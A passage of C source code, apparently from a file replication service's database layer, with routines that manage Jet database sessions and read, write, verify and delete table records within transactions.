    if (!JET_SUCCESS(jerr)) {
        if (jerr == JET_errIndexInvalidDef) {
            sprintf(TableName, "%s%05d", BaseTableName, TableCtx->ReplicaNumber);
            DPRINT2(0, "++ Schema error - Invalid keycode on index (%s) accessing table (%s)\n",
                   IndexName, TableName);
        }
        goto RET_CLOSE_TABLE;
    }

    //
    // Seek to the record.
    // If the record is not there (we are looking for equality) then return.
    //
    jerr = JetSeek(Sesid, Tid, JET_bitSeekEQ);
    if (jerr == JET_errRecordNotFound) {
        DPRINT_JS(4, "JetSeek - ", jerr);
        return FrsErrorNotFound;
    }
    CLEANUP_JS(0, "JetSeek error:", jerr, RET_CLOSE_TABLE);

    //
    // Perform Record read if requested.
    //
    if (Operation & ROP_READ) {
        //
        // Initialize the JetSet/RetCol arrays and data record buffer addresses
        // to read and write the fields of the ConfigTable records into ConfigRecord.
        //
        DbsSetJetColSize(TableCtx);
        DbsSetJetColAddr(TableCtx);

        //
        // Allocate the storage for the variable length fields in the record and
        // update the JetSet/RetCol arrays appropriately.
        //
        FStatus = FrsErrorResource;
        Status = DbsAllocRecordStorage(TableCtx);
        CLEANUP_NT(0, "++ ERROR - DbsAllocRecordStorage failed to alloc buffers.",
                   Status, ERROR_RET_FREE_RECORD);

        //
        // Now read the record.
        //
        FStatus = DbsTableRead(ThreadCtx, TableCtx);
        if (!FRS_SUCCESS(FStatus)) {
            DPRINT_FS(0, "Error - can't read selected record.", FStatus);
            goto ERROR_RET_FREE_RECORD;
        }
        DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);
    }

    //
    // Perform record delete if requested.
    //
    if (Operation & ROP_DELETE) {
        jerr = JetDelete(Sesid, Tid);
        CLEANUP1_JS(0, "JetDelete error on (%s) :", TableName, jerr, RETURN);
    }

    //
    // Close the table if this function opened it and the operation was not
    // a seek.
    //
    if ((Operation != ROP_SEEK) && (FrsOpenTableSaveTid == JET_tableidNil)) {
        goto RET_CLOSE_TABLE;
    }

    //
    // Success.
    //
    FStatus = FrsErrorSuccess;
    goto RETURN;


    //
    // Error return paths
    //

ERROR_RET_FREE_RECORD:

    //
    // Free any runtime allocated record buffers.
    //
    DbsFreeRecordStorage(TableCtx);


RET_CLOSE_TABLE:

    //
    // Close the table and reset TableCtx Tid and Sesid.   Macro writes 1st arg.
    //
    DbsCloseTable(jerr1, Sesid, TableCtx);
    DPRINT1_JS(0, "++ DbsCloseTable error on (%s)", TableName, jerr1);


RETURN:

    if (FStatus == FRS_MAX_ERROR_CODE) {
        FStatus = DbsTranslateJetError(jerr, FALSE);
    }
    return FStatus;

}



JET_ERR
DbsCreateJetSession(
    IN OUT PTHREAD_CTX    ThreadCtx
    )
/*++

Routine Description:

    This function creates a new jet session and opens the FRS database
    using the jet instance provided in the ThreadCtx.  It returns a
    jet session ID and a database ID to the caller through the ThreadCtx.

Arguments:

    ThreadCtx   - Thread context to init with Jet Instance, Session ID and DBID.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCreateJetSession:"

    JET_SESID   Sesid;
    JET_DBID    Dbid;
    JET_ERR     jerr, jerr1;

    JET_INSTANCE JInstance;

    JInstance = ThreadCtx->JInstance;

    ThreadCtx->JSesid = JET_sesidNil;
    ThreadCtx->JDbid  = JET_dbidNil;


RETRY_SESSION:

    //
    // Open a jet session.
    //
    jerr = JetBeginSession(JInstance, &Sesid, NULL, NULL);
    CLEANUP_JS(1, "JetBeginSession error:", jerr, ERROR_RET_NO_SESSION);

    DPRINT(4, "JetBeginSession complete\n");

    //
    // Attach the database
    //
    // The call may return a -1414 (Secondary Index Corrupted)
    //
    // The indexes were most likely corrupted because the build number changed
    // and jet marked the UNICODE indexes as corrupt.  As I understand it, jet
    // does this because jet is worried that the collating sequence changed
    // without warning.  The indexes will be rebuilt as the various tables are
    // opened and the deleted indexes detected; someday.
    //
    // Today, our only workaround is to describe a manual recovery
    // process for the user. See comments above.
    //
    // Excerpt from email from jet engineer:
    //
    // To override the FixedDDL flag, you have to open the table with the
    // grbits JET_bitTableDenyRead|JET_bitTablePermitDDL passed to
    // JetOpenTable().  This opens the table in exclusive mode and allows you
    // to add columns and indexes to the table.  Note that no other thread is
    // allowed access to the table while you are creating indexes.
    //
    // BUT the above doesn't quite work at this time because the JetAttachDatabase()
    // returns a -1323 when called with JET_bitDbDeleteCorruptIndexes.
    //

    jerr = JetAttachDatabase(Sesid,
                             JetFileA,
    // Note: Enable when jet fix for above is tested.
                             // JET_bitDbDeleteCorruptIndexes);
                             0);
    if ((!JET_SUCCESS(jerr)) &&
        (jerr != JET_wrnDatabaseAttached) &&
        (jerr != JET_wrnCorruptIndexDeleted)) {
        DPRINT_JS(0, "ERROR - JetAttachDatabase:", jerr);
        //
        // Note: Remove when jet fix for above is tested.
        //
        if (jerr == JET_errSecondaryIndexCorrupted) {
            goto ERROR_RET_SESSION;
        }
    }
    DPRINT(4,"JetAttachDatabase complete\n");
    //
    // The indexes were most likely corrupted because the build number changed
    // and jet marked the UNICODE indexes as corrupt.  As I understand it, jet
    // does this because jet is worried that the collating sequence changed
    // without warning.  The indexes will be rebuilt as the various tables are
    // opened and the deleted indexes detected.
    //
    if (jerr == JET_wrnCorruptIndexDeleted) {
        DPRINT(4, "WARN - Jet indexes were deleted\n");
    }

    //
    // Open database
    //
    jerr = JetOpenDatabase(Sesid, JetFileA, "", &Dbid, 0);
    CLEANUP_JS(1, "JetOpenDatabase error:", jerr, ERROR_RET_ATTACH);

    InterlockedIncrement(&OpenDatabases);
    DPRINT3(4, "DbsCreateJetSession - JetOpenDatabase. Session = %d. Dbid = %d.  Open database count: %d\n",
             Sesid, Dbid, OpenDatabases);

    //
    // Return the jet session and database ID context to the caller.
    //

    ThreadCtx->JSesid = Sesid;
    ThreadCtx->JDbid  = Dbid;

    return JET_errSuccess;

//
// Error return paths, do cleanup.
//

ERROR_RET_DB:
    jerr1 = JetCloseDatabase(Sesid, Dbid, 0);
    DPRINT1_JS(0, "ERROR - JetCloseDatabase(%s) :", JetFileA, jerr1);

ERROR_RET_ATTACH:
    jerr1 = JetDetachDatabase(Sesid, JetFileA);
    DPRINT1_JS(0, "ERROR - JetDetachDatabase(%s) :", JetFileA, jerr1);

ERROR_RET_SESSION:
    jerr1 = JetEndSession(Sesid, 0);
    DPRINT1_JS(0, "ERROR - JetEndSession(%s) :", JetFileA, jerr1);


ERROR_RET_NO_SESSION:

    return jerr;
}



JET_ERR
DbsCloseJetSession(
    IN PTHREAD_CTX  ThreadCtx
    )
/*++

Routine Description:

    This function closes a Jet session.  It closes the database and detaches
    then calls EndSession.  It sets the session ID and the database ID to
    NIL.

Arguments:

    ThreadCtx  -  The thread context provides Sesid and Dbid.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCloseJetSession:"

    JET_SESID    Sesid;
    JET_ERR      jerr;

    //
    // Recovery and cleanup may sometimes call this function with a NULL
    //
    if (ThreadCtx == NULL)
        return JET_errSuccess;

    //
    // Session ID for this thread
    //
    Sesid = ThreadCtx->JSesid;

    //
    // Close the database handle.
    //
    jerr = JetCloseDatabase(Sesid, ThreadCtx->JDbid, 0);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0,"ERROR - JetCloseDatabase:", jerr);
    } else {
        DPRINT(4,"JetCloseDatabase complete\n");
    }


    //
    // Detach from the database.
    //
    if (InterlockedDecrement(&OpenDatabases) == 0) {
        jerr = JetDetachDatabase(Sesid, NULL);
        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0,"ERROR - JetDetachDatabase:", jerr);
        } else {
            DPRINT(4,"JetDetachDatabase complete\n");
        }
    }
    DPRINT1(4, "Open databases: %d\n", OpenDatabases);

    //
    // End the session.
    //
    jerr = JetEndSession(Sesid, 0);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0,"JetEndSession error:", jerr);
    } else {
        DPRINT(4,"JetEndSession complete\n");
    }

    //
    // Clear session and db IDs to catch errors.
    //
    ThreadCtx->JSesid = JET_sesidNil;
    ThreadCtx->JDbid = JET_dbidNil;

    return jerr;

}


JET_ERR
DbsWriteReplicaTableRecord(
    IN PTHREAD_CTX   ThreadCtx,
    ULONG            ReplicaNumber,
    IN PTABLE_CTX    TableCtx
    )
/*++

Routine Description:

    This function writes the contents of the data record provided in the TableCtx
    struct to the corresponding table.  The Sesid comes from the ThreadCtx
    and the ReplicaNumber comes from the Replica struct.

    The table is opened if necessary but we assume the DataRecord in the table
    context is allocated and filled in.
    The JetSetCol struct is assumed to be initialized.

Arguments:

    ThreadCtx  -- ptr to the thread context.
    ReplicaNumber -- The ID number of the replica set.
    TableCtx   -- ptr to the table context.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsWriteReplicaTableRecord:"

    JET_ERR          jerr;
    JET_TABLEID      Tid;

    CHAR             TableName[JET_cbNameMost];
    JET_TABLEID      FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG


    Tid = TableCtx->Tid;

    //
    // Open the table if it's not already open and check the session id for match.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, TableCtx, ReplicaNumber, TableName, &Tid);
    CLEANUP1_JS(0, "++ FrsOpenTable (%s) :", TableName, jerr, RETURN);

    //
    // Now insert the record into the table.
    //
    jerr = DbsInsertTable2(TableCtx);
    DPRINT1_JS(0, "++ DbsInsertTable2() Failed on %s.", TableName, jerr);

RETURN:
    return jerr;


}



JET_ERR
DbsInsertTable2(
    IN PTABLE_CTX    TableCtx
    )
{
    return DbsWriteTableRecord(TableCtx, JET_prepInsert);
}




JET_ERR
DbsUpdateTable(
    IN PTABLE_CTX    TableCtx
    )
{
    return DbsWriteTableRecord(TableCtx, JET_prepReplace);
}


JET_ERR
DbsWriteTableRecord(
    IN PTABLE_CTX    TableCtx,
    IN ULONG         JetPrepareUpdateOption
    )
/*++

Routine Description:

    This function inserts or updates a record into a DB Table specified by Tablex.
    It writes all fields in the data record in the TableCtx
    struct to the corresponding table.  The Sesid comes from the TableCtx.

    It is assumed that the DataRecord in the table context is allocated
    and filled in.  The JetSetCol struct is assumed to be initialized.

    This routine updates the field size for those record fields that
    are unicode strings or variable length records.

Arguments:

    TableCtx    - Table context provides Jet sesid, tid, table create ptr,
                  jet set col struct and record data.

    JetPrepareUpdateOption - Either JET_prepInsert or JET_prepReplace

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsWriteTableRecord:"

    JET_ERR           jerr, jerr1;
    JET_SESID         Sesid;
    JET_TABLEID       Tid;
    PJET_SETCOLUMN    JSetColumn;
    PJET_SETCOLUMN    JSetColumnNext;
    PJET_TABLECREATE  JTableCreate;
    PJET_COLUMNCREATE JColDesc;
    PRECORD_FIELDS    FieldInfo;

    ULONG bcnt;
    ULONG cbActual;
    ULONG i;
    ULONG NumberColumns;

    CHAR              TableName[JET_cbNameMost];
    char Test[512];
    char  bookmark[255];


    Sesid          = TableCtx->Sesid;
    Tid            = TableCtx->Tid;
    JTableCreate   = TableCtx->pJetTableCreate;
    JSetColumn     = TableCtx->pJetSetCol;
    FieldInfo      = TableCtx->pRecordFields + 1;  // skip elt 0

    NumberColumns  = JTableCreate->cColumns;
    JColDesc       = JTableCreate->rgcolumncreate;

    //
    // Make the table name for error messages.
    //
    sprintf(TableName, "%s%05d",
            JTableCreate->szTableName, TableCtx->ReplicaNumber);

    //
    // Set length values on the variable len fields and clear the error codes.
    //
    for (i=0; i<NumberColumns; i++) {

        JSetColumn[i].err = JET_errSuccess;

        JSetColumn[i].cbData =
            DbsFieldDataSize(&FieldInfo[i], &JSetColumn[i], &JColDesc[i], TableName);
    }

    // Jet600 doesn't allow updates of certain data types (long values
    // like binary in particular) to be updated at transaction level 0.
    // So begin and end a transaction appropriately.

    jerr = JetBeginTransaction(Sesid);
    CLEANUP1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    //
    // DEBUG OPTION: cause out of space error
    //
    DBG_DBS_OUT_OF_SPACE_FILL(DBG_DBS_OUT_OF_SPACE_OP_WRITE);

    jerr = JetPrepareUpdate(Sesid, Tid, JetPrepareUpdateOption);
    CLEANUP1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, FALSE);

#if 0
    //
    // Set values into the columns of the new record.
    //
    jerr = JetSetColumns(Sesid, Tid, JSetColumn, NumberColumns);
    if (!JET_SUCCESS(jerr)) {
        DPRINT1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr);

        for (i=0; i<NumberColumns; i++) {

            jerr = JSetColumn[i].err;
            CLEANUP2_JS(0, "++ ERROR - JetSetColumns: Table - %s,  col - %s :",
                         TableName, JColDesc[i].szColumnName, jerr, ROLLBACK);
        }

        goto ROLLBACK;
    }
#endif

    //
    // Set values into the columns of the new record.  Do it 1 column at a
    // time so we can actually get an error status value.
    // Don't write any column if the autoincrement grbit is set.
    //
    JSetColumnNext = JSetColumn;
    for (i=0; i<NumberColumns; i++) {
        if ( (JColDesc[i].grbit & JET_bitColumnAutoincrement) == 0) {

            jerr = JetSetColumns(Sesid, Tid, JSetColumnNext, 1);

            if (!IsSpareField(FieldInfo[i].DataType)) {
                CLEANUP2_JS(0, "++ DbsWriteTableRecord() Failed on %s. Column: %d :",
                            TableName, i, jerr, ROLLBACK);
            }

        }
        JSetColumnNext += 1;
    }
    //
    // Insert the record in the database.  Get the bookmark.
    //
    jerr = JetUpdate(Sesid, Tid, bookmark, sizeof(bookmark), &bcnt);

    //
    // DEBUG OPTION - Trigger an out-of-space error
    //
    DBG_DBS_OUT_OF_SPACE_TRIGGER(jerr);
    CLEANUP1_JS(1, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    jerr = JetGotoBookmark(Sesid, Tid, bookmark, bcnt);
    CLEANUP1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    //
    // Test the insert by retrieving the data from col 0.
    // Note: Perf
    // Remove after debug, except for INlog table. - retrieval after write test.
    // Change Col 0 in inlog to be non-autoinc so we don't have to read it
    // back.  But then it has to be initialized at start up when we scan the log.
    //
    jerr = JetRetrieveColumn(Sesid,
                             Tid,
                             JSetColumn[0].columnid,
                             Test,
                             sizeof(Test),
                             &cbActual,
                             0,NULL);

    CLEANUP1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    //
    // The size and data better match.
    //
    if (cbActual != JSetColumn[0].cbData) {
        jerr = JET_errReadVerifyFailure;
        DPRINT1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr);
        DPRINT2(0, "++   cbActual = %d, not equal cbData = %d\n",
                cbActual, JSetColumn[0].cbData);
        goto ROLLBACK;
    }

    if ((TableCtx->TableType != INLOGTablex) &&
        (TableCtx->TableType != OUTLOGTablex)) {
        //
        // Column 1 won't match for the LOG tables since it is an autoinc col.
        //
        if (memcmp(Test, JSetColumn[0].pvData, cbActual) != 0) {
            jerr = JET_errReadVerifyFailure;
            DPRINT1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr);
            DPRINT(0, "++ Data inserted not equal to data returned for column 0\n");
            goto ROLLBACK;
        }
    } else {
        //
        // return the value for column 1 for the LOGs since the caller needs it.
        //
        CopyMemory((const PVOID)JSetColumn[0].pvData, Test, cbActual);
    }

    //
    // Commit the transaction.
    //
    jerr = JetCommitTransaction(Sesid, 0);
    CLEANUP1_JS(0, "++ DbsWriteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_WRITE);

    //
    // Success
    //
    return jerr;


    //
    // Failure.  Try to rollback transaction.
    //
ROLLBACK:

    jerr1 = JetRollback(Sesid, 0);
    DPRINT1_JS(0, "++ ERROR - JetRollback failed creating tables for replica %d.",
               TableCtx->ReplicaNumber, jerr1);

    DBS_DISPLAY_RECORD_SEV(1, TableCtx, FALSE);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_WRITE);

    //
    // Shutdown if the database volume is full
    //
    DbsExitIfDiskFull(jerr1);
    DbsExitIfDiskFull(jerr);

    return jerr;
}


JET_ERR
DbsDeleteTableRecord(
    IN PTABLE_CTX    TableCtx
    )
/*++

Routine Description:

    This function deletes the current record in the table specified by Tablex.
    The Sesid comes from the TableCtx.

Arguments:

    TableCtx    - Table context provides Jet sesid, tid.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDeleteTableRecord:"

    JET_ERR           jerr, jerr1;
    JET_SESID         Sesid;
    PJET_COLUMNCREATE JColDesc;
    PJET_TABLECREATE  JTableCreate;
    CHAR              TableName[JET_cbNameMost];

    Sesid          = TableCtx->Sesid;
    JTableCreate   = TableCtx->pJetTableCreate;

    //
    // Make the table name for error messages.
    //
    sprintf(TableName, "%s%05d", JTableCreate->szTableName, TableCtx->ReplicaNumber);

    // Jet600 doesn't allow updates of certain data types (long values
    // like binary in particular) to be updated at transaction level 0.
    // So begin and end a transaction appropriately.

    jerr = JetBeginTransaction(Sesid);
    CLEANUP1_JS(0, "++ DbsDeleteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, FALSE);

    //
    // DEBUG OPTION: Fill up the volume containing the database
    //
    DBG_DBS_OUT_OF_SPACE_FILL(DBG_DBS_OUT_OF_SPACE_OP_REMOVE);

    jerr = JetDelete(Sesid, TableCtx->Tid);
    //
    // DEBUG OPTION - Trigger an out-of-space error
    //
    DBG_DBS_OUT_OF_SPACE_TRIGGER(jerr);
    CLEANUP1_JS(0, "++ DbsDeleteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    //
    // Commit the transaction.
    //
    jerr = JetCommitTransaction(Sesid, 0);
    CLEANUP1_JS(0, "++ DbsDeleteTableRecord() Failed on %s.", TableName, jerr, ROLLBACK);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_REMOVE);

    //
    // Success
    //
    return jerr;

    //
    // Failure.  Try to rollback transaction.
    //
ROLLBACK:

    jerr1 = JetRollback(Sesid, 0);
    DPRINT1_JS(0, "++ ERROR - JetRollback failed creating tables for replica %d.",
               TableCtx->ReplicaNumber, jerr1);
    DBS_DISPLAY_RECORD_SEV(1, TableCtx, FALSE);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_REMOVE);

    //
    // Shutdown if the database volume is full
    //
    DbsExitIfDiskFull(jerr1);
    DbsExitIfDiskFull(jerr);

    return jerr;
}

ULONG
DbsWriteTableField(
    IN PTHREAD_CTX   ThreadCtx,
    IN ULONG         ReplicaNumber,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         RecordFieldx
    )
/*++

Routine Description:

    This function writes a single field provided in the data record in the TableCtx
    struct to the corresponding table.  The Sesid comes from the ThreadCtx.

    It is assumed that a previous seek to the desired record has been performed
    and the DataRecord in the table context is allocated and filled in.
    The JetSetCol struct is assumed to be initialized.

    This routine updates the field size for the record in the case of strings
    and variable length records.

Arguments:

    ThreadCtx  -- ptr to the thread context.
    ReplicaNumber  -- ID number of replica set.
    TableCtx   -- ptr to the table context.
    RecordFieldx -- id of the field column to update.

Return Value:

    FrsError status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsWriteTableField:"

    return DbsWriteTableFieldMult(ThreadCtx,
                                  ReplicaNumber,
                                  TableCtx,
                                  &RecordFieldx,
                                  1);
}




ULONG
DbsWriteTableFieldMult(
    IN PTHREAD_CTX   ThreadCtx,
    IN ULONG         ReplicaNumber,
    IN PTABLE_CTX    TableCtx,
    IN PULONG        RecordFieldx,
    IN ULONG         FieldCount
    )
/*++

Routine Description:

    This function writes multiple fields provided in the data record in
    the TableCtx struct to the corresponding table.  The Sesid comes from
    the ThreadCtx.  This is all done under a single transaction.

    It is assumed that a previous seek to the desired record has been performed
    and the DataRecord in the table context is allocated and filled in.
    The JetSetCol struct is assumed to be initialized.

    This routine updates the field sizes for the record in the case of strings
    and variable length fields.

Arguments:

    ThreadCtx  -- ptr to the thread context.
    ReplicaNumber  -- ID number of replica set.
    TableCtx   -- ptr to the table context.
    RecordFieldx -- ptr to an array of field ids for the columns to update.
    FieldCount -- Then number of field entries in the RecordFieldx array.

Return Value:

    FrsError status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsWriteTableFieldMult:"

    JET_ERR           jerr, jerr1;
    JET_SESID         Sesid;
    JET_TABLEID       Tid;
    PJET_SETCOLUMN    JSetColumn;
    PJET_COLUMNCREATE JColDesc;
    PRECORD_FIELDS    FieldInfo;

    ULONG             NumberColumns;
    PJET_TABLECREATE  JTableCreate;
    CHAR              TableName[JET_cbNameMost];

    ULONG bcnt;
    ULONG cbActual;
    ULONG i, j;

    char Test[512];
    char  bookmark[255];

    //
    // Get the ptr to the table create struct, the set col struct and the
    // and the Tid from the TableCtx.  Get the number of columns in the
    // table from the jet table create struct.
    // Get the Replica number from the replica struct.
    //

    Sesid          = TableCtx->Sesid;
    Tid            = TableCtx->Tid;
    JTableCreate   = TableCtx->pJetTableCreate;
    JSetColumn     = TableCtx->pJetSetCol;
    FieldInfo      = TableCtx->pRecordFields + 1;  // skip elt 0

    NumberColumns  = JTableCreate->cColumns;
    JColDesc       = JTableCreate->rgcolumncreate;

    //
    // Make the table name for error messages.
    //
    sprintf(TableName, "%s%05d", JTableCreate->szTableName, TableCtx->ReplicaNumber);

    //
    // Jet600 doesn't allow updates of certain data types (long values
    // like binary in particular) to be updated at transaction level 0.
    // So begin and end a transaction appropriately.
    //
    jerr = JetBeginTransaction(Sesid);
    CLEANUP1_JS(0, "++ DbsWriteTableFieldMult Failed on %s.",
                TableName, jerr, ROLLBACK);

    //
    // DEBUG OPTION: Fill up the volume containing the database
    //
    DBG_DBS_OUT_OF_SPACE_FILL(DBG_DBS_OUT_OF_SPACE_OP_MULTI);

    jerr = JetPrepareUpdate(Sesid, Tid, JET_prepReplace);
    CLEANUP1_JS(0, "++ DbsWriteTableFieldMult Failed on %s.",
                TableName, jerr, ROLLBACK);

    //
    // Loop thru the fields to be updated.
    //
    for (j=0; j<FieldCount; j++) {
        i = RecordFieldx[j];
        //
        // Check for out of range Field Index or trying to write to a spare field.
        //
        if (i >= NumberColumns) {
            DPRINT2(0, "++ DbsWriteTableFieldMult() parm %d out of range on %s.\n", j, TableName);
            return FrsErrorBadParam;
        }

        if (IsSpareField(FieldInfo[i].DataType)) {
            DPRINT2(0, "++ Warning -- Writing a spare field (%d) on %s.\n", j, TableName);
            return FrsErrorBadParam;
        }

        JSetColumn[i].err = JET_errSuccess;
        JSetColumn[i].cbData =
            DbsFieldDataSize(&FieldInfo[i], &JSetColumn[i], &JColDesc[i], TableName);

        //
        // Set the value into the column of the record.
        //
        jerr = JetSetColumns(Sesid, Tid, &JSetColumn[i], 1);
        CLEANUP1_JS(0, "++ DbsWriteTableFieldMult Failed on %s.",
                    TableName, jerr, ROLLBACK);

        jerr = JSetColumn[i].err;
        CLEANUP2_JS(0, "++ ERROR - DbsWriteTableFieldMult: Table - %s,  col - %s :",
                    TableName, JColDesc[i].szColumnName, jerr, ROLLBACK);
    }
    //
    // Insert the record in the database.  Get the bookmark.
    //
    jerr = JetUpdate(Sesid, Tid, bookmark, sizeof(bookmark), &bcnt);
    //
    // DEBUG OPTION - Trigger an out-of-space error
    //
    DBG_DBS_OUT_OF_SPACE_TRIGGER(jerr);
    CLEANUP1_JS(0, "++ DbsWriteTableFieldMult() Failed on %s.",
                TableName, jerr, ROLLBACK);

#if DBG
    jerr = JetGotoBookmark(Sesid, Tid, bookmark, bcnt);
    CLEANUP1_JS(0, "++ DbsWriteTableFieldMult() Failed on %s.",
                TableName, jerr, ROLLBACK);

    //
    // Test the insert by retrieving the data.
    //
    jerr = JetRetrieveColumn(Sesid,
                             Tid,
                             JSetColumn[i].columnid,
                             Test,
                             sizeof(Test),
                             &cbActual,
                             0,NULL);

    CLEANUP1_JS(0, "++ DbsWriteTableFieldMult() Failed on %s.",
                TableName, jerr, ROLLBACK);

    if ((jerr == JET_wrnBufferTruncated) &&
        (JSetColumn[i].cbData > sizeof(Test))) {
        //
        // Field was bigger then our Test buffer.  Just compare what we got.
        //
        cbActual = JSetColumn[i].cbData;
    }

    //
    // The size and data better match.
    //
    if (cbActual != JSetColumn[i].cbData) {
        jerr = JET_errReadVerifyFailure;
        DPRINT1_JS(0, "++ DbsWriteTableFieldMult() Failed on %s.", TableName, jerr);
        DPRINT2(0, "++   cbActual = %d, not equal cbData = %d\n",
                cbActual, JSetColumn[0].cbData);
        goto ROLLBACK;
    }

    if (memcmp(Test, JSetColumn[i].pvData, min(cbActual, sizeof(Test))) != 0) {
        jerr = JET_errReadVerifyFailure;
        JColDesc =  JTableCreate->rgcolumncreate;
        DPRINT1_JS(0, "++ DbsWriteTableFieldMult() Failed on %s.", TableName, jerr);
        DPRINT1(0, "++ Data inserted not equal to data returned for column %s\n",
               JColDesc[i].szColumnName);
        goto ROLLBACK;
    }
#endif

    //
    // Commit the transaction.
    //
    jerr = JetCommitTransaction(Sesid, 0);
    CLEANUP1_JS(0, "++ DbsWriteTableFieldMult() Failed on %s.",
                TableName, jerr, ROLLBACK);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_MULTI);

    //
    // Success
    //
    return FrsErrorSuccess;


    //
    // Failure.  Try to rollback transaction.
    //
ROLLBACK:

    jerr1 = JetRollback(Sesid, 0);
    DPRINT1_JS(0, "++ ERROR - JetRollback failed writing record for replica %d.",
               TableCtx->ReplicaNumber, jerr1);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_MULTI);

    //
    // Shutdown if the database volume is full
    //
    DbsExitIfDiskFull(jerr1);
    DbsExitIfDiskFull(jerr);

    return DbsTranslateJetError(jerr, FALSE);
}



ULONG
DbsFieldDataSize(
    IN PRECORD_FIELDS    FieldInfo,
    IN PJET_SETCOLUMN    JSetColumn,
    IN PJET_COLUMNCREATE JColDesc,
    IN PCHAR             TableName
    )
/*++

Routine Description:

    Calculate the actual data size for a record field for insertion into
    a Jet Record.  Handle unicode string types and variable length
    record fields.  The later MUST be prefixed with a size/type
    FRS_NODE_HEADER which provides the size.

    If the Data Type for the field is marked as spare don't alloc storage.

Arguments:


    FieldInfo -- ptr to the table's record field entry.
    JSetColumn -- ptr to the table's JET_SETCOLUMN entry for this field.
    JColDesc -- ptr to the table's JET_COLUMNCREATE entry for this field.
    TableName -- name of table for error messages.

Return Value:

    The field size to use for the insert.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsFieldDataSize:"

    ULONG  DataSize;
    ULONG  DataType = (ULONG) MaskPropFlags(FieldInfo->DataType);
    BOOL   Spare = IsSpareField(FieldInfo->DataType);


    //
    // Obscure table in jet doc says itag sequence must be >0 to overwrite a
    // long value column.
    //
    if ((JColDesc->coltyp == JET_coltypLongText) ||
        (JColDesc->coltyp == JET_coltypLongBinary)) {
        JSetColumn->itagSequence = 1;
    }

    //
    // Check if field buffer has been deleted.
    //
    if (JSetColumn->pvData == NULL) {
        return 0;
    }

    //
    // Strings.
    //
    if ((DataType == DT_UNICODE)   ||
        (DataType == DT_DIR_PATH)  ||
        (DataType == DT_FILE_LIST) ||
        (DataType == DT_FILENAME)) {
        DataSize = Spare ? 0 : 2 * (wcslen(JSetColumn->pvData) + 1);
    } else

    //
    // Fields with Variable sized buffers.
    // *** WARNING ***
    //
    // If the record structure field size is less than the max column width AND
    // is big enough to hold a pointer AND has a datatype of DT_BINARY then the
    // record is assumed to be variable length.  The record insert code
    // automatically adjusts the length from the record's Size prefix.  All
    // DT_BINARY fields MUST BE prefixed with a ULONG SIZE.  There are some
    // fields that are variable length which don't have a size prefix like
    // FSVolInfo in the config record.  But these fields MUST have a unique / non
    // binary data type assigned to them.  Failure to do this causes the insert
    // routines to stuff things up to ColMaxWidth bytes into the database.
    //

    if (FIELD_IS_PTR(FieldInfo->Size, JColDesc->cbMax) &&
        FIELD_DT_IS_BINARY(DataType)) {

        DataSize = Spare ? 0 : *(PULONG)(JSetColumn->pvData);
    } else

    //
    // Fields with fixed Size buffers with var len data.
    //
    // The record field is not a pointer but if the column type is LongBinary
    // then, as above, the first ULONG of data must be the valid data
    // length in the fixed sized buffer.  An example of this is the
    // IDTable record extension fields.  They use a compiled
    // in field size in the record struct declarations but in the Jet schema
    // they are defined as JET_coltypLongBinary with a max size of 2 Meg.
    // The length prefix tells us how much to write.
    //
    // Note: For backward compatibility of new versions of FRS running with
    // with databases written by older versions of FRS it is required that
    // the structure size declarations for fields like the above NEVER get
    // smaller in size.
    //
    if ((JColDesc->coltyp == JET_coltypLongBinary) &&
        IsFixedSzBufferField(FieldInfo->DataType)) {

        DataSize = Spare ? 0 : *(PULONG)(JSetColumn->pvData);
    } else
    if (DataType == DT_FSVOLINFO) {
        //
        // This is a case of fixed size field with a ptr in the base record
        // to a fixed size buffer.   There is no length prefix.
        // DbsAllocRecordStorage() will have called DbsReallocateFieldBuffer()
        // to allocate the buffer and sets JSet/RetColumn.cbData to the
        // allocated size.
        //
        DataSize = JSetColumn->cbData;
    } else {
        //
